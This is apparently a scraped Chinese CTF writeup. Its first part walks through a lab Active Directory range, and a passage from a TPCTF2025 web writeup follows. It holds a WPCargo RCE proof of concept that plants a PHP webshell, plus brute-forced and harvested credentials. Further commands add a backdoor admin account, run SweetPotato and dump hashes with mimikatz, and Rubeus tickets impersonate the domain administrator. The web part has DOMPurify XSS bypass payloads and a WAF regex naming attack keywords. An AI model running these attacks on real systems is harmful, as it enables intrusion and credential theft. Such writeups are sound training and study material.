[SUCCESS] 端口开放 172.22.2.18:445 47[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:1433 48[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:6379 49[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.18:22 =\u0026gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.] 50[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.7:22 =\u0026gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.] 51[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.7:21 =\u0026gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).] 52[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.7:80 =\u0026gt; [http] 版本:1.20.1 产品:nginx 53[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:445 =\u0026gt; 54[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:389 =\u0026gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 55[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.34:139 =\u0026gt; Banner:[.] 56[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:139 =\u0026gt; Banner:[.] 57[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:139 =\u0026gt; Banner:[.] 58[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.34:445 =\u0026gt; 59[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:445 =\u0026gt; 60[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:80 =\u0026gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows 61[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:88 =\u0026gt; 62[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.16:1433 =\u0026gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.] 63[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.7:6379 =\u0026gt; [redis] 版本:5.0.12 产品:Redis key-value store 64[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.18:80 =\u0026gt; [http] 65[2025-03-17 20:12:05] [SUCCESS] 服务识别 172.22.2.18:139 =\u0026gt; 66[2025-03-17 20:12:06] [SUCCESS] 服务识别 172.22.2.18:445 =\u0026gt; 67[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.34:135 =\u0026gt; 68[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.16:135 =\u0026gt; 69[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.3:135 =\u0026gt; 70[2025-03-17 20:12:10] [INFO] 存活端口数量: 21 71[2025-03-17 20:12:10] [INFO] 开始漏洞扫描 72[2025-03-17 20:12:10] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle 73[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果 74目标主机: 172.22.2.3 75主机名: DC 76发现的网络接口: 77 IPv4地址: 78 └─ 172.22.2.3 79[2025-03-17 20:12:10] [SUCCESS] 网站标题 http://172.22.2.16 状态码:404 长度:315 标题:Not Found 80[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.34 XIAORANG\\CLIENT01 81[2025-03-17 20:12:10] [SUCCESS] 网站标题 http://172.22.2.7 状态码:200 长度:4833 标题:Welcome to CentOS 82[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393 83[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.3 DC:DC.xiaorang.lab Windows Server 2016 Datacenter 14393 84[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.2.16 86主机名: MSSQLSERVER 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.2.16 90[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果 91目标主机: 172.22.2.34 92主机名: CLIENT01 93发现的网络接口: 94 IPv4地址: 95 └─ 172.22.2.34 96[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 97[2025-03-17 20:12:11] [SUCCESS] 网站标题 http://172.22.2.18 状态码:200 长度:57738 标题:又一个WordPress站点 98[2025-03-17 20:12:13] [SUCCESS] Redis 172.22.2.7:6379 发现未授权访问 文件位置:/usr/local/redis/db/module.so 99[2025-03-17 20:12:17] [SUCCESS] Redis无密码连接成功: 172.22.2.7:6379 100[2025-03-17 20:12:18] [SUCCESS] 扫描已完成: 37/37 扫出来四台机子\nNetBios 172.22.2.34 XIAORANG\\CLIENT01\rNetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab\rNetBios 172.22.2.3 DC:DC.xiaorang.lab\rNetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 WordPress 172.22.2.18上有一个wordpress服务，看看能不能从这里入手\n拿wpscan扫一下\nproxychains4 wpscan --url 172.22.2.18 --api-token my_token 扫出来一堆洞\n有个能够rce的，感觉比较好利用\n1 2 | [!] Title: WPCargo \u0026lt; 6.9.0 - Unauthenticated RCE 3 | Fixed in: 6.9.0 4 | References: 5 | - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a 6 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003 找一下漏洞的poc\nWPCargo \u0026lt; 6.9.0 – Unauthenticated RCE | CVE 2021-25003 | Plugin Vulnerabilities\npoc\n1import sys 2import binascii 3import requests 4 5# This is a magic string that when treated as pixels and compressed using the png 6# algorithm, will cause \u0026lt;?=$_GET[1]($_POST[2]);?\u0026gt; to be written to the png file 7payload = \u0026#39;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50\u0026#39; 8 9def encode_character_code(c: int): 10 return \u0026#39;{:08b}\u0026#39;.format(c).replace(\u0026#39;0\u0026#39;, \u0026#39;x\u0026#39;) 11 12text = \u0026#39;\u0026#39;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:] 13 14destination_url = \u0026#39;http://127.0.0.1:8001/\u0026#39; 15cmd = \u0026#39;ls\u0026#39; 16 17# With 1/11 scale, \u0026#39;1\u0026#39;s will be encoded as single white pixels, \u0026#39;x\u0026#39;s as single black pixels. 18requests.get( 19 f\u0026#34;{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}\u0026amp;sizefactor=.090909090909\u0026amp;size=1\u0026amp;filepath=/var/www/html/webshell.php\u0026#34; 20) 21 22# We have uploaded a webshell - now let\u0026#39;s use it to execute a command. 23print(requests.post( 24 f\u0026#34;{destination_url}webshell.php?1=system\u0026#34;, data={\u0026#34;2\u0026#34;: cmd} 25).content.decode(\u0026#39;ascii\u0026#39;, \u0026#39;ignore\u0026#39;)) 成功RCE，用户是www-data\n但是靶机不出网，没办法上线\n那就直接用蚁剑连\n在wordpress的配置文件中找到数据库的账号密码\n1// ** Database settings - You can get this info from your web host ** // 2/** The name of the database for WordPress */ 3define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); 4 5/** Database username */ 6define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wpuser\u0026#39; ); 7 8/** Database password */ 9define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;WpuserEha8Fgj9\u0026#39; ); 10 11/** Database hostname */ 12define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;127.0.0.1\u0026#39; ); 13 14/** Database charset to use in creating database tables. */ 15define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); 16 17/** The database collate type. Don\u0026#39;t change this if in doubt. */ 18define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); wpuser/WpuserEha8Fgj9 这个机子不对外开放端口，所以我们直接用webshell管理器上的数据库管理工具连\n拿到第二个flag\nflag{c757e423-eb44-459c-9c63-7625009910d8} FLAG3 在表S0meth1ng_y0u_m1ght_1ntereSted有一堆密码\n不知道有什么用，先导出来\n注意这里用蚁剑导出之前记得将limit去掉，不然密码不全\n172.22.2.16上有mssql服务\nNetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393 用我们手上的这堆密码爆破一下\n成功拿到账号密码\nsa/ElGNkOiC 接下来直接用mdut连\n拿到nt service\\mssqlserver权限\n没找到flag，猜测需要提权。\n可以用SweetPotato提权\nC:/Users/Public/sweetpotato.exe -a \u0026#34;whoami\u0026#34; 拿到第三个flag\n=====================================\r8\u0026#34;\u0026#34;\u0026#34;\u0026#34;8 88 8\u0026#34;\u0026#34;\u0026#34;8 8 8 eeee\re e e eeeee eeee 88 8 8 eeeee eeeee eeeee 8eeee8ee 8 8 8 8 8 8 88 88 8eee8e 8 88 8 8 8 8 88 8 8eee8e 8e 8 8e 8eee 88ee88 88 8 8 8 8eee8 8e 8 88 8 88 8 88 8 88 88 88 88 8 8 8 88 8 88 8 88eeeee8 88 8 88ee8 88 88ee 88 88 8 8eee8 88 8 88ee8 flag03: flag{6fc1b639-d71c-4c8b-9747-e29074e05a7e} FLAG4 新建一个用户用rdp连上去\nnet user xrntkk Abc123456 /add\rnet localgroup administrators xrntkk /add\rREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 信息收集一下\n发现这台机子在域内\n用bloodhound做一下信息收集\nchu0的图，偷过来了![undefined (1)](../assets/undefined (1).png)\n从图中我们可以看到，MSSQLSERVER 具有对 DC 的约束性委派权限\n我们可以尝试进行约束性委派攻击\n什么是约束性委派？ 原理大致如下，参考文章：\nhttps://xz.aliyun.com/news/13854\n所以我们接下来就要尝试用mimikatz抓取hash，然后申请TGT，最后伪造S4U请求访问DC\n先传一个mimikatz.exe，管理员打开\nlog\rprivilege::Debug sekurlsa::logonpasswords exit 抓到一个用户hash\nAuthentication Id : 0 ; 95385 (00000000:00017499)\rSession : Service from 0\rUser Name : ReportServer\rDomain : NT Service\rLogon Server : (null)\rLogon Time : 2025/3/17 19:28:19\rSID : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051\rmsv :\t[00000003] Primary\r* Username : MSSQLSERVER$\r* Domain : XIAORANG\r* NTLM : 7e7c2b7d5cbee13683f637e721e4a147\r* SHA1 : d112e5ca3e3c502539058a39f153b432642aec96\rtspkg :\twdigest :\t* Username : MSSQLSERVER$\r* Domain : XIAORANG\r* Password : (null)\rkerberos :\t* Username : MSSQLSERVER$\r* Domain : xiaorang.lab\r* Password : 6c 8f 64 88 42 1e e5 dc ea 08 1f 03 05 9b e4 a5 50 70 b8 74 77 7b 50 b1 1e 80 d5 4b 0e 79 7c 9b b6 75 53 56 49 19 66 72 a9 d3 50 f8 d3 ab 0e bd e3 14 96 72 a5 fb b5 3f dc d9 ce 37 91 a2 5f d6 a1 2c 39 ea dc f3 80 e6 d2 cd c0 e6 f2 45 cd d1 80 aa f2 7f 47 09 44 ca 7d aa a0 10 c8 3c 5e e0 ae 71 77 f4 f3 1b 13 88 ab 39 68 37 41 43 e0 45 eb 6c 2d f6 fd 67 c6 ac 67 3e dd 56 71 48 b2 ed 7a f8 8c 4f d6 30 67 a2 32 8f 05 a0 2e 65 05 ce af 7d a6 c2 8e d9 c9 fc 31 6b 8e a1 7f 95 0a 2b 68 88 db 11 d9 9c f5 af 68 8c 0e ac 03 93 79 07 59 dd e6 da 42 2c 72 55 8d 3d 35 a9 85 49 90 3f 7b fb 7d b2 72 f7 76 7e ba c5 f0 98 77 fa 18 b2 b4 7c 65 d2 84 b7 8b e3 b2 fe bf 00 92 24 3b 9c b2 98 d3 5b 82 d4 d1 9f b5 aa c9 3b 54 33 26 34 ssp :\tcredman :\t先用这个账号申请一个TGT\nRubeus.exe asktgt /user:MSSQLSERVER$ /rc4:7e7c2b7d5cbee13683f637e721e4a147 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap \u0026gt; TGT.txt 结果\n______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___)\r| | \\ \\| |_| | |_) ) ____| |_| |___ |\r|_| |_|____/|____/|_____)____/(___/\rv2.3.2 [*] Action: Ask TGT\r[*] Using rc4_hmac hash: 7e7c2b7d5cbee13683f637e721e4a147\r[*] Building AS-REQ (w/ preauth) for: \u0026#39;xiaorang.lab\\MSSQLSERVER$\u0026#39;\r[*] Using domain controller: 172.22.2.3:88\r[+] TGT request successful!\r[*] base64(ticket.kirbi):\rdoIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==\rServiceName : krbtgt/xiaorang.lab\rServiceRealm : XIAORANG.LAB\rUserName : MSSQLSERVER$ (NT_PRINCIPAL)\rUserRealm : XIAORANG.LAB\rStartTime : 2025/3/17 23:24:57\rEndTime : 2025/3/18 9:24:57\rRenewTill : 2025/3/24 23:24:57\rFlags : name_canonicalize, pre_authent, initial, renewable, forwardable\rKeyType : rc4_hmac\rBase64(key) : gifE8e2s2Hg361IDstjCZA==\rASREP (key) : 7E7C2B7D5CBEE13683F637E721E4A147 得到base64编码的TGT票据，利用Rubeus导入票据\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg== 接下来就可以和DC进行通讯了\nWIN+R\r\\\\DC.xiaorang.lab\\C$\\Users\\Administrator\\flag\\ 或者\ntype \\\\DC.xiaorang.lab\\C$\\Users\\Administrator\\flag\\flag04.txt ######: ### ######: ##\r####### ## :### ####### ##\r## :## ## .#### ## :## ##\r## ## ##.#### ## ## ####### .####: ##.## ## ## .####. :#### :###.##\r## :## ####### ## ## ####### .######: :#: ## ## :## .######. ###### :#######\r#######. ###. ## ## ## ##: :## .## ## #######: ### ### #: :## ### ###\r#######. ## ## ## ## ######## ## ## ###### ##. .## :##### ##. .##\r## :## ## ## ## ## ######## ######## ## ##. ## ## .####### ## ##\r## ## ## ## ## ## ## ######## ## ## ##. .## ## . ## ##. .##\r## :## ## ##: ### ##. ###. :# ## ## :## ### ### ##: ### ### ###\r######## ## ####### ##### .####### ## ## ##: .######. ######## :#######\r###### ## ###.## .#### .#####: ## ## ### .####. ###.## :###.##\rWell done hacking!\rThis is the final flag, you deserve it!\rflag04: flag{1c3cf693-f2fc-4f35-aece-789e66f56ecc} ","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/","summary":"\u003cp\u003e参考文章\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://bowuchuling.github.io/posts/chunqiuBrute4Road.html\"\u003ehttps://bowuchuling.github.io/posts/chunqiuBrute4Road.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\"\u003ehttps://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://xz.aliyun.com/news/12189#toc-6\"\u003e文章 - 浅谈约束委派攻击 - 先知社区\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e拿到靶机先用fscan扫一扫\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e┌──────────────────────────────────────────────┐\r\n│    ___                              _        │\r\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\r\n│  / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ /    │\r\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026lt;     │\r\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\r\n└──────────────────────────────────────────────┘\r\n      Fscan Version: 2.0.0\r\n\r\n[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1\r\n[2025-03-17 14:12:55] [INFO] 开始信息扫描\r\n[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1\r\n[2025-03-17 14:12:55] [INFO] 开始主机扫描\r\n[2025-03-17 14:12:55] [INFO] 有效端口数量: 233\r\n[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80\r\n[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22\r\n[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379\r\n[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21\r\n[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 =\u0026gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\r\n[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 =\u0026gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]\r\n[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 =\u0026gt; [http] 版本:1.20.1 产品:nginx\r\n[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 =\u0026gt; [redis] 版本:5.0.12 产品:Redis key-value store\r\n[2025-03-17 14:13:06] [INFO] 存活端口数量: 4\r\n[2025-03-17 14:13:06] [INFO] 开始漏洞扫描\r\n[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle\r\n[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207      状态码:200 长度:4833   标题:Welcome to CentOS\r\n[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功!\r\n[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb\r\n[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379\r\n[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e发现redis不需要密码\u003c/p\u003e","title":"春秋云镜-Brute4Road-Writeup"},{"content":" 参考文章\nhttps://blog.0xfff.team/posts/tpctf_2025_writeup/\nhttps://z3n1th1.com/2025/03/tpctf2025-writeup/\nTPCTF2025 Writeup - 星盟安全团队\nbaby layout 这是一道关于绕过DOMPurify库，进行xss cookie窃取的题目\nDOMPurify 是一个专门用于清理 HTML 输入的 JavaScript 库，旨在防止跨站脚本 (XSS) 攻击。它通过过滤和净化用户提供的 HTML 内容，确保其安全地嵌入到网页中，避免恶意代码的执行。\n在这道题中调用了DOMPurify库对content 进行 HTML 内容的净化，以防止 XSS 攻击，而且将净化后的内容替换到 layout 字符串中特定的占位符 {{content}} 处\n另外在下边的创建Layout处也会调用DOMPurify库的sanitize\nsanitize的工作原理大致如下\n那既然这两边都被进行了内容的净化，难以直接进行xss，那我们是否可以通过两者结合的方式进行xss呢\n先尝试一下这个\nlayout：\r\u0026lt;img src onerror=\u0026#34;{{content}}\u0026#34;\u0026gt;\rcontent：\ralert(1) 发现不行，因为当传入的内容为html的时候DOMPurify会对其中的元素进行解析，其中onerror为危险属性所有被净化掉了\n所以layout变成了\n\u0026lt;img src=1 \u0026gt; 但是如果我们传入的内容不为html结构的时候，DOMPurify无法对元素进行解析和净化，是可以正常传入onerror的\n所以可以这样构造payload\nlayout：\r\u0026lt;img src=\u0026#34;{{content}}\u0026#34;\u0026gt;\rcontent：\r1\u0026#34; onerror=\u0026#34;alert(1) safe-layout 这题和上一题的区别是增加了ALLOWED_ATTR: []\nconst sanitizedContent = DOMPurify.sanitize(content, { ALLOWED_ATTR: [] }); 一个类似白名单的东西。\n但是这玩意其实并不是白名单，虽然说禁用了所有的属性，但是data-*和aira-*属性还是可以正常使用的\n这篇文章中有提到：\nhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists\n所以可以构造出payload\ncontent\n123\u0026#34; onload=\u0026#34;alert(1) layout\n\u0026lt;svg data-type=\u0026#34;{{content}}\u0026#34;\u0026gt;\u0026lt;/svg\u0026gt; 或者是\nlayout\n\u0026lt;svg aria-hidden=\u0026#34;{{content}}\u0026#34;\u0026gt;\u0026lt;/svg\u0026gt; safe layout revenge 这题把上题中使用的aria-*和data-*给ban掉了\n还是看上题中的那篇文章\nhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce\n在这篇文章中提到的CVE-2023-48219中，会在DOMpurify后将\\uFFFF替换为空。\n所以这里可以利用\\uFEFF对html代码进行截断，从而绕过DOMpurify\n回到这道题，我们这里也可以达到类似的效果。我们可以用{{content}}来代替\\uFEFF对html进行截断。\n所以payload就是\n//content为空\rlayout：\rx\u0026lt;style\u0026gt;\u0026lt;{{content}}/style\u0026gt;\u0026lt;{{content}}img src=x onerror=alert(123)\u0026gt;\u0026lt;/style\u0026gt; supersqli 考点：解析差异绕过和quine注入\n拿到附件\n我们可以看到这道题用go实现了一个反向代理和WAF\n1var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) 2 3var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) 4 5var hotfixPattern = regexp.MustCompile(`(?i)(select)`) 6 7var blockedUserAgents = []string{ 8\t\u0026#34;sqlmap\u0026#34;, 9\t\u0026#34;nmap\u0026#34;, 10\t\u0026#34;curl\u0026#34;, 11} 再看到urls.py\n1from django.contrib import admin 2from django.urls import path 3from blog import views 4 5urlpatterns = [ 6 path(\u0026#34;flag/\u0026#34;, views.flag, name=\u0026#34;flag\u0026#34;), 7 path(\u0026#34;\u0026#34;, views.index, name=\u0026#34;index\u0026#34;), 8] 